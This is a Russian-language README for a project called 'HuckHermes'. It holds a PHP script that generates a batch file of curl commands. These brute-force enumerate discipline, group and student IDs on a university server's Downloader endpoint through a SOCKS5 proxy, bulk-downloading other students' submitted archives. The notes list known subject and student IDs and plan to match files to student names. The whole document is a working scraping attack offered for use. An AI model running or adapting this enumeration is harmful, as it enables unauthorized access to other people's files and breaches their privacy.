# HuckHermes
TODO:
Алгоритм, убирающий ложные архивы. Найти все предметы. Желательно составить белый список дисциплин. Можно список людей.(Открывать ворд, искать первую строку после "Выполнил:" и ставить в ассоциацию?(


Как работает: запускается алгорит, который создаёт txt\bat файл с запросами к серверу.
Редактировать алгоритм в prog.php
Файлы заранее создаётся в директории с .php файлами. Названия должны совпадать. Созданный батник желательно запускать в отдельной папке. txt переименовать в bat.
--socks5 127.0.0.1:9090 - прокси. Выбираем свой порт. Если подключаетесь с общаги, возможно не потребуется.

Запускаем jskript
"Запустить"
Перебираем наши значения.




                                    Что известно:
Группы:(возможно, не влияют на запрос)
176 - 12001801
177 - 12001802

Предметы:
47 - параллельное программирование
46- веб 2 семестр
204 - Базы Данных
43 - веб 1 семестр

Студенты:
2400- 01 группа
2433 - Я
2430 - ДОВЛЕТ


ОСНОВНОЙ АЛГОРИТМ:
________________________________________________________________________________________________________________________________
 $file = 'people.txt';
      $current = file_get_contents($file);
      $current.="Mkdir file\n";
     for ($Disc=40; $Disc <50 ; $Disc++) { 
        for ($Group=176; $Group < 178; $Group++) { 
            for ($Student=2400; $Student <2500 ; $Student++) { 
               // $current = file_get_contents($file);
                for ($Count=0; $Count <5 ; $Count++) { 
                    for ($Type=0; $Type <10 ; $Type++) { 
                        for ($num=0; $num <20 ; $num++) { 
                           // $current.="Mkdir ";
                            $current .= "curl -o X:/XAMPP/htdocs/HackerMan/files/file/D".$Disc."G".$Group."S".$Student."C".$Count."T".$Type."N".$num.".zip --socks5 127.0.0.1:9090  172.23.64.64:8080//Downloader?\"idDiscipline=".$Disc."&idGroup=".$Group."&idStudent=".$Student."&Count=".$Count."&type=".$Type."&num=".$num."\"\n";
                        }
                    }
                }
               // file_put_contents($file, $current);
            }
        }
     }
     $current .="pause";
     file_put_contents($file, $current); 
     
     __________________________________________________________________________________________________________________________
